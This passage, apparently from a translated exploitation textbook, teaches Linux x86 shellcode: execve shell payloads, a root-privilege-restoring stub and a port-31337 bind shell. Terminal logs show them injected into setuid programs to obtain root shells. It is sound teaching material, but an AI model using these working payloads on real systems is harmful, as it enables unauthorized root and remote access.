  xor eax, eax      ; Put 0 into eax.
  mov [ebx+7], al   ; Null terminate the /bin/sh string.
  mov [ebx+8], ebx  ; Put addr from ebx where the AAAA is.
  mov [ebx+12], eax ; Put 32-bit null terminator where the BBBB is.
  `lea ecx, [ebx+8]  ; Load the address of [ebx+8] into ecx for argv ptr.`
  lea edx, [ebx+12] ; Edx = ebx + 12, which is the envp ptr.
  mov al, 11        ; Syscall #11
  int 0x80          ; Do it.

two:
  call one          ; Use a call to get string address.
  db '/bin/shXAAAABBBB'     ; The XAAAABBBB bytes aren't needed.
```

在终止字符串并构建数组之后，shellcode 使用`lea`指令（如上所示加粗）将参数数组的指针放入 ECX 寄存器。将一个加值后的括号寄存器的有效地址加载是一个高效地将值加到寄存器并将结果存储在另一个寄存器中的方法。在上面的例子中，括号将 EBX+8 作为`lea`的参数，将这个地址加载到 EDX。加载一个解引用指针的地址会产生原始指针，因此这个指令将 EBX+8 放入 EDX。通常，这需要`mov`和`add`指令。当汇编时，这个 shellcode 不包含空字节。当用于漏洞利用时，它将启动一个 shell。

```
reader@hacking:~/booksrc $ nasm exec_shell.s
reader@hacking:~/booksrc $ wc -c exec_shell
36 exec_shell
reader@hacking:~/booksrc $ hexdump -C exec_shell
00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b  |..[1..C..[..C..K|
00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S........../bi|
00000020  6e 2f 73 68                                       |n/sh|
00000024
reader@hacking:~/booksrc $ export SHELLCODE=$(cat exec_shell)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9c0
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\xc0\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
sh-3.2# whoami
root
sh-3.2#
```

然而，这个 shellcode 可以缩短到当前 45 字节以下。由于 shellcode 需要注入到程序内存的某个地方，较小的 shellcode 可以在更紧凑的利用情况下使用较小的可用缓冲区。shellcode 越小，可以使用的场景就越多。显然，可以从字符串末尾剪掉`XAAAABBBB`这种视觉辅助工具，将 shellcode 缩短到 36 字节。

```
reader@hacking:~/booksrc/shellcodes $ hexdump -C exec_shell
00000000  eb 16 5b 31 c0 88 43 07  89 5b 08 89 43 0c 8d 4b  |..[1..C..[..C..K|
00000010  08 8d 53 0c b0 0b cd 80  e8 e5 ff ff ff 2f 62 69  |..S........../bi|
00000020  6e 2f 73 68                                       |n/sh|
00000024
reader@hacking:~/booksrc/shellcodes $ wc -c exec_shell
36 exec_shell
reader@hacking:~/booksrc/shellcodes $
```

这个 shellcode 可以通过重新设计并更有效地使用寄存器来进一步缩小。ESP 寄存器是栈指针，指向栈顶。当值被推入栈时，ESP 在内存中向上移动（通过减去 4），值被放置在栈顶。当值从栈中弹出时，ESP 中的指针在内存中向下移动（通过加上 4）。

以下 shellcode 使用`push`指令在内存中构建`execve()`系统调用所需的必要结构。

### tiny_shell.s

```
BITS 32

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; Zero out eax.
  push eax          ; Push some nulls for string termination.
  push 0x68732f2f   ; Push "//sh" to the stack.
  push 0x6e69622f   ; Push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx, via esp.
  push eax          ; Push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; Push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  mov al, 11        ; Syscall #11.
  int 0x80          ; Do it.
```

这个 shellcode 在栈上构建了以 null 结尾的字符串`"/bin//sh"`，然后复制 ESP 作为指针。多余的反斜杠无关紧要，并且实际上会被忽略。同样的方法用于构建剩余参数的数组。结果 shellcode 仍然会启动一个 shell，但只有 25 字节，而使用`jmp`调用方法则是 36 字节。

```
reader@hacking:~/booksrc $ nasm tiny_shell.s 
reader@hacking:~/booksrc $ wc -c tiny_shell
25 tiny_shell
reader@hacking:~/booksrc $ hexdump -C tiny_shell
00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 50  |1.Ph//shh/bin..P|
00000010  89 e2 53 89 e1 b0 0b cd  80                       |..S......|
00000019
reader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff9cb
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\xcb\xf9\xff\xbf"x40')
[DEBUG] found a 34 byte note for user id 999
[DEBUG] found a 41 byte note for user id 999
[DEBUG] found a 5 byte note for user id 999
[DEBUG] found a 35 byte note for user id 999
[DEBUG] found a 9 byte note for user id 999
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
sh-3.2#
```

## 权限问题

为了帮助缓解权限提升的泛滥，一些特权进程在执行不需要那种访问权限的事情时，会降低其有效权限。这可以通过`seteuid()`函数来完成，该函数将设置有效用户 ID。通过更改有效用户 ID，可以改变进程的权限。`seteuid()`函数的手册页如下所示。

```
SETEGID(2)                 Linux Programmer's Manual                SETEGID(2)

NAME
       seteuid, setegid - set effective user or group ID

SYNOPSIS
       #include <sys/types.h>
       #include <unistd.h>

       int seteuid(uid_t euid);
       int setegid(gid_t egid);

DESCRIPTION
       seteuid() sets the effective user ID of the current process.
       Unprivileged user processes may only set the effective user ID to
       ID to the real user ID, the effective user ID or the saved set-user-ID.
       Precisely the same holds for setegid() with "group" instead of "user".

RETURN VALUE
       On success, zero is returned. On error, -1 is returned, and errno is
       set appropriately.
```

此函数在以下代码中用于在调用有漏洞的`strcpy()`之前将权限降低到“games”用户。

### drop_privs.c

```
#include <unistd.h>
void lowered_privilege_function(unsigned char *ptr) {
   char buffer[50];
   seteuid(5);  // Drop privileges to games user.
   strcpy(buffer, ptr);
}
int main(int argc, char *argv[]) {
   if (argc > 0)
      lowered_privilege_function(argv[1]);
}
```

尽管这个编译后的程序被设置为 root 的 setuid，但在 shellcode 执行之前，权限被降低到 games 用户。这只为 games 用户启动了一个 shell，而没有 root 访问权限。

```
reader@hacking:~/booksrc $ gcc -o drop_privs drop_privs.c
reader@hacking:~/booksrc $ sudo chown root ./drop_privs; sudo chmod u+s ./drop_privs
reader@hacking:~/booksrc $ export SHELLCODE=$(cat tiny_shell)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs
SHELLCODE will be at 0xbffff9cb
reader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print "\xcb\xf9\xff\xbf"x40')
sh-3.2$ whoami
games
sh-3.2$ id
uid=999(reader) gid=999(reader) euid=5(games)
groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),
104(scan
ner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)
sh-3.2$
```

幸运的是，我们可以在 shellcode 的开始处通过系统调用来恢复权限，将权限设置回 root。最完整的方法是使用`setresuid()`系统调用来设置真实、有效和保存的用户 ID。系统调用号和手册页如下所示。

```
reader@hacking:~/booksrc $ grep -i setresuid /usr/include/asm-i386/unistd.h
`#define __NR_setresuid          164`
#define __NR_setresuid32        208
reader@hacking:~/booksrc $ man 2 setresuid
 SETRESUID(2)               Linux Programmer's Manual              SETRESUID(2)

NAME
       setresuid, setresgid - set real, effective and saved user or group ID

SYNOPSIS
       #define _GNU_SOURCE
       #include <unistd.h>

       int setresuid(uid_t ruid, uid_t euid, uid_t suid);
       int setresgid(gid_t rgid, gid_t egid, gid_t sgid);

DESCRIPTION
       setresuid() sets the real user ID, the effective user ID, and the saved
       set-user-ID of the current process.
```

以下 shellcode 在启动 shell 之前调用`setresuid()`来恢复 root 权限。

### priv_shell.s

```
BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; Zero out eax.
  xor ebx, ebx      ; Zero out ebx.
  xor ecx, ecx      ; Zero out ecx.
  xor edx, edx      ; Zero out edx.
  mov al,  0xa4     ; 164 (0xa4) for syscall #164
  int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.

; execve(const char *filename, char *const argv [], char *const envp[])
  xor eax, eax      ; Make sure eax is zeroed again.
  mov al, 11        ; syscall #11
  push ecx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push ecx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```

这样，即使程序在利用时以降低的权限运行，shellcode 也可以恢复权限。以下通过以降低的权限利用相同的程序来演示这种效果。

```
reader@hacking:~/booksrc $ nasm priv_shell.s
reader@hacking:~/booksrc $ export SHELLCODE=$(cat priv_shell)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./drop_privs
SHELLCODE will be at 0xbffff9bf
reader@hacking:~/booksrc $ ./drop_privs $(perl -e 'print "\xbf\xf9\xff\xbf"x40')
sh-3.2# whoami
root
sh-3.2# id
uid=0(root) gid=999(reader)
groups=4(adm),20(dialout),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),
104(scan
ner),112(netdev),113(lpadmin),115(powerdev),117(admin),999(reader)
sh-3.2#
```

## 更小了

这段 Shellcode 还可以进一步减少几个字节。有一个单字节*x*86 指令叫做`cdq`，代表*将双字转换为四字*。这个指令不使用操作数，总是从 EAX 寄存器获取源数据，并将结果存储在 EDX 和 EAX 寄存器之间。由于寄存器是 32 位双字，需要两个寄存器来存储 64 位四字。转换仅仅是将 32 位整数的符号位扩展到 64 位整数。从操作的角度来看，这意味着如果 EAX 的符号位是`0`，`cdq`指令将清零 EDX 寄存器。使用`xor`来清零 EDX 寄存器需要两个字节；所以，如果 EAX 已经是零，使用`cdq`指令来清零 EDX 将节省一个字节

```
	`31 D2`            xor edx,edx
```

相比于

```
	`99`               cdq
```

通过巧妙地使用堆栈，还可以节省一个字节。由于堆栈是 32 位对齐的，向堆栈推送的单字节值将被对齐为双字。当这个值被弹出时，它将被符号扩展，填充整个寄存器。推送单个字节并将其弹回到寄存器的指令需要三个字节，而使用`xor`来清零寄存器和移动单个字节需要四个字节

```
	`31 C0`            xor eax,eax
	`B0 0B`            mov al,0xb
```

相比于

```
	`6A 0B`            push byte +0xb
	`58`               pop eax
```

这些技巧（以粗体显示）在下面的 Shellcode 列表中使用。这些汇编成与上一章中使用的相同的 Shellcode。

### shellcode.s

```
BITS 32

; setresuid(uid_t ruid, uid_t euid, uid_t suid);
  xor eax, eax      ; Zero out eax.
  xor ebx, ebx      ; Zero out ebx.
  xor ecx, ecx      ; Zero out ecx.
  `cdq               ; Zero out edx using the sign bit from eax.`
  mov BYTE al, 0xa4 ; syscall 164 (0xa4)
  int 0x80          ; setresuid(0, 0, 0)  Restore all root privs.

; execve(const char *filename, char *const argv [], char *const envp[])
  `push BYTE 11      ; push 11 to the stack.   pop eax           ; pop the dword of 11 into eax.`
  push ecx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push ecx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```

推送单个字节的语法需要声明大小。有效的大小有`BYTE`表示一个字节，`WORD`表示两个字节，`DWORD`表示四个字节。这些大小可以从寄存器宽度中推断出来，因此将数据移动到 AL 寄存器意味着`BYTE`大小。虽然不是所有情况下都需要使用大小，但这并不妨碍，并且可以帮助提高可读性。

# 端口绑定 Shellcode

当利用远程程序时，我们迄今为止设计的 Shellcode 将不起作用。注入的 Shellcode 需要通过网络进行通信以提供交互式 root 提示符。端口绑定 Shellcode 将 Shell 绑定到监听传入连接的网络端口。在上一章中，我们使用这种 Shellcode 来利用 tinyweb 服务器。下面的 C 代码绑定到端口 31337 并监听 TCP 连接。

## 端口绑定 Shellcode

### bind_port.c

```
#include <unistd.h>
#include <string.h>
#include <sys/socket.h>
#include <netinet/in.h>
#include <arpa/inet.h>

int main(void) {
   int sockfd, new_sockfd;  // Listen on sock_fd, new connection on new_fd
   struct sockaddr_in host_addr, client_addr;   // My address information
   socklen_t sin_size;
   int yes=1;

   sockfd = socket(PF_INET, SOCK_STREAM, 0);

   host_addr.sin_family = AF_INET;         // Host byte order
   host_addr.sin_port = htons(31337);      // Short, network byte order
   host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.
   memset(&(host_addr.sin_zero), '\0', 8); // Zero the rest of the struct.

   bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));

   listen(sockfd, 4);
   sin_size = sizeof(struct sockaddr_in);
   new_sockfd = accept(sockfd, (struct sockaddr *)&client_addr, &sin_size);
}
```

这些熟悉的套接字函数都可以通过单个 Linux 系统调用访问，这个系统调用被恰当地命名为`socketcall()`。这是系统调用号 102，它的手册页有些晦涩。

```
reader@hacking:~/booksrc $ grep socketcall /usr/include/asm-i386/unistd.h
#define __NR_socketcall         102
reader@hacking:~/booksrc $ man 2 socketcall
IPC(2)                     Linux Programmer's Manual                     IPC(2)

NAME
       socketcall - socket system calls

SYNOPSIS
       int socketcall(int call, unsigned long *args);

DESCRIPTION
       socketcall() is a common kernel entry point for the socket system calls. call
       determines which socket function to invoke. args points to a block containing
       the actual arguments, which are passed through to the appropriate call.

       User programs should call  the  appropriate  functions  by  their  usual
       names.   Only  standard  library implementors and kernel hackers need to
       know about socketcall().
```

首个参数的可能调用号列在`linux/net.h`包含文件中。

### 来自 /usr/include/linux/net.h

```
#define SYS_SOCKET  1   /* sys_socket(2)    */
#define SYS_BIND  2   /* sys_bind(2)      */
#define SYS_CONNECT 3   /* sys_connect(2)   */
#define SYS_LISTEN  4   /* sys_listen(2)    */
#define SYS_ACCEPT  5   /* sys_accept(2)    */
#define SYS_GETSOCKNAME 6   /* sys_getsockname(2)   */
#define SYS_GETPEERNAME 7   /* sys_getpeername(2)   */
#define SYS_SOCKETPAIR  8   /* sys_socketpair(2)    */
#define SYS_SEND  9   /* sys_send(2)      */
#define SYS_RECV  10    /* sys_recv(2)      */
#define SYS_SENDTO  11    /* sys_sendto(2)    */
#define SYS_RECVFROM  12    /* sys_recvfrom(2)    */
#define SYS_SHUTDOWN  13    /* sys_shutdown(2)    */
#define SYS_SETSOCKOPT  14    /* sys_setsockopt(2)    */
#define SYS_GETSOCKOPT  15    /* sys_getsockopt(2)    */
#define SYS_SENDMSG 16    /* sys_sendmsg(2)   */
#define SYS_RECVMSG 17    /* sys_recvmsg(2)   */
```

因此，为了使用 Linux 进行套接字系统调用，EAX 总是`102`对于`socketcall()`，EBX 包含套接字调用的类型，而 ECX 是指向套接字调用参数的指针。这些调用很简单，但其中一些需要`sockaddr`结构，这必须由 Shellcode 构建。通过调试编译的 C 代码是最直接查看这种结构在内存中的方法。

```
reader@hacking:~/booksrc $ gcc -g bind_port.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) list 18
13         sockfd = socket(PF_INET, SOCK_STREAM, 0);
14
15         host_addr.sin_family = AF_INET;         // Host byte order
16         host_addr.sin_port = htons(31337);      // Short, network byte order
17         host_addr.sin_addr.s_addr = INADDR_ANY; // Automatically fill with my IP.
18         memset(&(host_addr.sin_zero), '\0', 8); // Zero the rest of the struct.
19
20         bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));
21
22         listen(sockfd, 4);
(gdb) break 13
Breakpoint 1 at 0x804849b: file bind_port.c, line 13.
(gdb) break 20
Breakpoint 2 at 0x80484f5: file bind_port.c, line 20.
(gdb) run
Starting program: /home/reader/booksrc/a.out

Breakpoint 1, main () at bind_port.c:13
13         sockfd = socket(PF_INET, SOCK_STREAM, 0);
(gdb) x/5i $eip
0x804849b <main+23>:    mov    DWORD PTR [esp+8],0x0
0x80484a3 <main+31>:    mov    DWORD PTR [esp+4],0x1
0x80484ab <main+39>:    mov    DWORD PTR [esp],0x2
0x80484b2 <main+46>:    call   0x8048394 <socket@plt>
0x80484b7 <main+51>:    mov    DWORD PTR [ebp-12],eax
(gdb)
```

第一个断点发生在套接字调用之前，因为我们需要检查`PF_INET`和`SOCK_STREAM`的值。所有三个参数都是按相反顺序推入堆栈的（但使用`mov`指令）。这意味着`PF_INET`是`2`，`SOCK_STREAM`是`1`。

```
(gdb) cont
Continuing.

Breakpoint 2, main () at bind_port.c:20
20         bind(sockfd, (struct sockaddr *)&host_addr, sizeof(struct sockaddr));
(gdb) print host_addr
$1 = {sin_family = 2, sin_port = 27002, sin_addr = {s_addr = 0},
  sin_zero = "\000\000\000\000\000\000\000"}
(gdb) print sizeof(struct sockaddr)
$2 = 16
(gdb) x/16xb &host_addr
0xbffff780:     `0x02    0x00    0x7a    0x69    0x00    0x00    0x00    0x00`
0xbffff788:     0x00    0x00    0x00    0x00    0x00    0x00    0x00    0x00
(gdb) p /x 27002
$3 = 0x697a
(gdb) p 0x7a69
$4 = 31337
(gdb)
```

下一个断点发生在`sockaddr`结构体填充值之后。当打印`host_addr`时，调试器足够智能以解码结构体的元素，但现在你需要足够聪明，意识到端口号以网络字节序存储。`sin_family`和`sin_port`元素都是单词，后面跟着一个`DWORD`地址。在这种情况下，地址是`0`，这意味着可以使用任何地址进行绑定。之后的剩余八个字节只是结构体中的额外空间。结构体中的前八个字节（以粗体显示）包含所有重要信息。

以下汇编指令执行了绑定到端口 31337 和接受 TCP 连接所需的全部套接字调用。`sockaddr`结构体和参数数组都是通过将值以相反顺序推入堆栈，然后将 ESP 复制到 ECX 中创建的。`sockaddr`结构体的最后八个字节实际上没有推入堆栈，因为它们没有被使用。堆栈上随机出现的八个字节将占据这个空间，这是可以的。

### bind_port.s

```
BITS 32

; s = socket(2, 1, 0)
  push BYTE 0x66    ; socketcall is syscall #102 (0x66).
  pop eax
  cdq               ; Zero out edx for use as a null DWORD later.
  xor ebx, ebx      ; ebx is the type of socketcall.
  inc ebx           ; 1 = SYS_SOCKET = socket()
  push edx          ; Build arg array: { protocol = 0,
  push BYTE 0x1     ;   (in reverse)     SOCK_STREAM = 1,
  push BYTE 0x2     ;                    AF_INET = 2 }
  mov ecx, esp      ; ecx = ptr to argument array
  int 0x80          ; After syscall, eax has socket file descriptor.

  mov esi, eax      ; save socket FD in esi for later

; bind(s, [2, 31337, 0], 16)
  push BYTE 0x66    ; socketcall (syscall #102)
  pop eax
  inc ebx           ; ebx = 2 = SYS_BIND = bind()
  push edx          ; Build sockaddr struct:  INADDR_ANY = 0
  push WORD 0x697a  ;   (in reverse order)    PORT = 31337
  push WORD bx      ;                         AF_INET = 2
  mov ecx, esp      ; ecx = server struct pointer
  push BYTE 16      ; argv: { sizeof(server struct) = 16,
  push ecx          ;         server struct pointer,
  push esi          ;         socket file descriptor }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = 0 on success

; listen(s, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx
  inc ebx           ; ebx = 4 = SYS_LISTEN = listen()
  push ebx          ; argv: { backlog = 4,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80

; c = accept(s, 0, 0)
  mov BYTE al, 0x66 ; socketcall (syscall #102)
  inc ebx           ; ebx = 5 = SYS_ACCEPT = accept()
  push edx          ; argv: { socklen = 0,
  push edx          ;         sockaddr ptr = NULL,
  push esi          ;         socket fd }
  mov ecx, esp      ; ecx = argument array
  int 0x80          ; eax = connected socket FD

```

当汇编并用于攻击时，此 shellcode 将绑定到端口 31337 并等待传入的连接，在`accept`调用处阻塞。当建立连接时，新的套接字文件描述符将放在此代码的 EAX 寄存器中。这实际上直到与前面描述的 shell 创建代码结合使用时才有用。幸运的是，标准文件描述符使得这种融合变得非常简单。

## 复制标准文件描述符

标准输入、标准输出和标准错误是程序执行标准输入输出所使用的三个标准文件描述符。套接字也是如此，它们是可以被读取和写入的文件描述符。通过简单地将创建的 shell 的输入、输出和错误标准文件描述符与连接的套接字文件描述符交换，shell 就会将输出和错误写入套接字，并从套接字接收的字节中读取输入。有一个专门用于复制文件描述符的系统调用，称为`dup2`。这是系统调用编号 63。

```
reader@hacking:~/booksrc $ grep dup2 /usr/include/asm-i386/unistd.h
#define __NR_dup2                63
reader@hacking:~/booksrc $ man 2 dup2
DUP(2)                     Linux Programmer's Manual                     DUP(2)

NAME
       dup, dup2 - duplicate a file descriptor

SYNOPSIS
       #include <unistd.h>
       int dup(int oldfd);
       int dup2(int oldfd, int newfd);

DESCRIPTION
       dup() and dup2() create a copy of the file descriptor oldfd.

       dup2() makes newfd be the copy of oldfd, closing newfd first if necessary.
```

bind_port.s shellcode 在 EAX 寄存器中留下连接的套接字文件描述符。在文件 bind_shell_beta.s 中添加了以下指令以将此套接字复制到标准 I/O 文件描述符中；然后调用 tiny_shell 指令在当前进程中执行 shell。创建的 shell 的标准输入和输出文件描述符将是 TCP 连接，允许远程 shell 访问。

### 从 bind_shell1.s 的新指令

```
; dup2(connected socket, {all three standard I/O file descriptors})
  mov ebx, eax      ; Move socket FD in ebx.
  push BYTE 0x3F    ; dup2  syscall #63
  pop eax
  xor ecx, ecx      ; ecx = 0 = standard input
  int 0x80          ; dup(c, 0)
  mov BYTE al, 0x3F ; dup2  syscall #63
  inc ecx           ; ecx = 1 = standard output
  int 0x80          ; dup(c, 1)
  mov BYTE al, 0x3F ; dup2  syscall #63
  inc ecx           ; ecx = 2 = standard error
  int 0x80          ; dup(c, 2)

; execve(const char *filename, char *const argv [], char *const envp[])
  mov BYTE al, 11   ; execve  syscall #11
  push edx          ; push some nulls for string termination.
  push 0x68732f2f   ; push "//sh" to the stack.
  push 0x6e69622f   ; push "/bin" to the stack.
  mov ebx, esp      ; Put the address of "/bin//sh" into ebx via esp.
  push ecx          ; push 32-bit null terminator to stack.
  mov edx, esp      ; This is an empty array for envp.
  push ebx          ; push string addr to stack above null terminator.
  mov ecx, esp      ; This is the argv array with string ptr.
  int 0x80          ; execve("/bin//sh", ["/bin//sh", NULL], [NULL])
```

当这段 shellcode 被汇编并用于攻击时，它将绑定到端口 31337 并等待传入的连接。在下面的输出中，grep 被用来快速检查空字节。最后，进程挂起等待连接。

```
reader@hacking:~/booksrc $ nasm bind_shell_beta.s
reader@hacking:~/booksrc $ hexdump -C bind_shell_beta | grep --color=auto 00
00000000  6a 66 58 99 31 db 43 52  6a 01 6a 02 89 e1 cd 80  |jfX.1.CRj.j.....|
00000010  89 c6 6a 66 58 43 52 66  68 7a 69 66 53 89 e1 6a  |..jfXCRfhzifS..j|
00000020  10 51 56 89 e1 cd 80 b0  66 43 43 53 56 89 e1 cd  |.QV.....fCCSV...|
00000030  80 b0 66 43 52 52 56 89  e1 cd 80 89 c3 6a 3f 58  |..fCRRV......j?X|
00000040  31 c9 cd 80 b0 3f 41 cd  80 b0 3f 41 cd 80 b0 0b  |1....?A...?A....|
00000050  52 68 2f 2f 73 68 68 2f  62 69 6e 89 e3 52 89 e2  |Rh//shh/bin..R..|
00000060  53 89 e1 cd 80                                    |S....|
00000065
reader@hacking:~/booksrc $ export SHELLCODE=$(cat bind_shell_beta)
reader@hacking:~/booksrc $ ./getenvaddr SHELLCODE ./notesearch
SHELLCODE will be at 0xbffff97f
reader@hacking:~/booksrc $ ./notesearch $(perl -e 'print "\x7f\xf9\xff\xbf"x40')
[DEBUG] found a 33 byte note for user id 999
-------[ end of note data ]-------
```

在另一个终端窗口中，使用 netstat 程序来查找监听端口。然后，使用 netcat 连接到该端口的 root shell。

```
reader@hacking:~/booksrc $ sudo netstat -lp | grep 31337
tcp        0      0   *:31337          *:*            LISTEN     25604/notesearch
reader@hacking:~/booksrc $ nc -vv 127.0.0.1 31337
localhost [127.0.0.1] 31337 (?) open
whoami
root
```

## 分支控制结构

C 编程语言的控制结构，如 for 循环和 if-then-else 块，由机器语言中的条件分支和循环组成。使用控制结构，`dup2`的重复调用可以被缩减为一个循环中的单个调用。在前面章节中编写的第一个 C 程序使用了 for 循环来向世界问候 10 次。反汇编主函数将显示编译器如何使用汇编指令实现 for 循环。循环指令（如下所示，加粗）位于函数前导指令之后，为局部变量`i`保存栈内存。这个变量相对于 EBP 寄存器被引用为`[ebp-4]`。

```
reader@hacking:~/booksrc $ gcc firstprog.c
reader@hacking:~/booksrc $ gdb -q ./a.out
Using host libthread_db library "/lib/tls/i686/cmov/libthread_db.so.1".
(gdb) disass main
Dump of assembler code for function main:
0x08048374 <main+0>:    push   ebp
0x08048375 <main+1>:    mov    ebp,esp
0x08048377 <main+3>:    sub    esp,0x8
0x0804837a <main+6>:    and    esp,0xfffffff0
0x0804837d <main+9>:    mov    eax,0x0
0x08048382 <main+14>:   sub    esp,eax
`0x08048384 <main+16>:   mov    DWORD PTR [ebp-4],0x0 0x0804838b <main+23>:   cmp    DWORD PTR [ebp-4],0x9 0x0804838f <main+27>:   jle    0x8048393 <main+31> 0x08048391 <main+29>:   jmp    0x80483a6 <main+50>`
0x08048393 <main+31>:   mov    DWORD PTR [esp],0x8048484
0x0804839a <main+38>:   call   0x80482a0 <printf@plt>
`0x0804839f <main+43>:   lea    eax,[ebp-4] 0x080483a2 <main+46>:   inc    DWORD PTR [eax] 0x080483a4 <main+48>:   jmp    0x804838b <main+23>`
0x080483a6 <main+50>:   leave
0x080483a7 <main+51>:   ret
End of assembler dump.
(gdb)
```

循环包含两个新的指令：`cmp`（比较）和`jle`（如果小于或等于则跳转），后者属于条件跳转指令家族。`cmp`指令将比较其两个操作数，并根据结果设置标志。然后，条件跳转指令将根据标志进行跳转。在上面的代码中，如果`[ebp-4]`中的值小于或等于 9，执行将跳转到`0x8048393`，跳过下一个`jmp`指令。否则，下一个`jmp`指令将执行跳转到函数末尾的`0x080483a6`，退出循环。循环体调用`printf()`，增加`[ebp-4]`处的计数器变量，并最终跳回比较指令以继续循环。使用条件跳转指令，可以在汇编中创建复杂的编程控制结构，如循环。下面显示了更多的条件跳转指令。

| 指令 | 描述 |
| --- | --- |
| `cmp <dest>, <source>` | 比较目标操作数与源操作数，根据结果设置标志，用于条件跳转指令。 |
| `je <target>` | 如果比较的值相等则跳转到目标。 |
| `jne <target>` | 如果不相等则跳转。 |
| `jl <target>` | 如果小于则跳转。 |
| `jle <target>` | 如果小于或等于则跳转。 |
| `jnl <target>` | 如果不小于则跳转。 |
| `jnle <target>` | 如果不小于或等于则跳转。 |
| `jg jge` | 如果大于，或大于等于则跳转。 |
| `jng jnge` | 如果不大于，或不大于等于则跳转。 |

这些指令可以用来将 shellcode 中的`dup2`部分缩减到以下内容：

```
; dup2(connected socket, {all three standard I/O file descriptors})
  mov ebx, eax      ; Move socket FD in ebx.
  xor eax, eax      ; Zero eax.
  xor ecx, ecx      ; ecx = 0 = standard input
`dup_loop:   mov BYTE al, 0x3F ; dup2  syscall #63   int 0x80          ; dup2(c, 0)   inc ecx   cmp BYTE cl, 2        ; Compare ecx with 2.   jle dup_loop      ; If ecx <= 2, jump to dup_loop.`
```

这个循环从 `0` 迭代到 `2`，每次调用 `dup2`。通过对 `cmp` 指令使用的标志的更完整理解，这个循环可以进一步缩短。由 `cmp` 指令设置的标志也被大多数其他指令设置，描述了指令结果的属性。这些标志包括进位标志 (CF)、奇偶标志 (PF)、调整标志 (AF)、溢出标志 (OF)、零标志 (ZF) 和符号标志 (SF)。最后两个标志最有用且最容易理解。如果结果是零，则零标志设置为真，否则为假。符号标志简单地是结果的最重要位，如果结果是负数则设置为真，否则为假。这意味着，在执行任何产生负结果的指令后，符号标志变为真，而零标志变为假。

| Abbreviation | Name | Description |
| --- | --- | --- |
| ZF | 零标志 | 如果结果是零则为真。 |
| SF | 符号标志 | 如果结果是负数（等于结果的最重要位）则为真。 |

`cmp`（比较）指令实际上只是一个 `sub`（减法）指令，它丢弃了结果，只影响状态标志。`jle`（如果小于或等于则跳转）指令实际上是在检查零和符号标志。如果这两个标志中的任何一个为真，则目标（第一个）操作数小于或等于源（第二个）操作数。其他条件跳转指令以类似的方式工作，并且还有更多直接检查单个状态标志的条件跳转指令：

| Instruction | Description |
| --- | --- |
| `jz <target>` | 如果零标志被设置，则跳转到目标。 |
| `jnz <target>` | 如果零标志没有被设置，则跳转。 |
| `js <target>` | 如果符号标志被设置，则跳转。 |
| `jns <target>` | 如果符号标志没有被设置，则跳转。 |

带着这些知识，如果循环的顺序被反转，可以完全删除 `cmp`（比较）指令。从 `2` 开始计数向下，可以检查符号标志直到 `0`。缩短后的循环如下所示，变化以粗体显示。

```
; dup2(connected socket, {all three standard I/O file descriptors})
  mov ebx, eax      ; Move socket FD in ebx.
  xor eax, eax      ; Zero eax.
  `push BYTE 0x2     ; ecx starts at 2.   pop ecx`
dup_loop:
  mov BYTE al, 0x3F ; dup2  syscall #63
  int 0x80          ; dup2(c, 0)
  `dec ecx           ; Count down to 0.   jns dup_loop      ; If the sign flag is not set, ecx is not negative.`
```

循环之前的前两个指令可以使用 `xchg`（交换）指令缩短。这个指令交换源和目标操作数之间的值：

| Instruction | Description |
| --- | --- |
| `xchg <dest>, <source>` | 交换两个操作数之间的值。 |

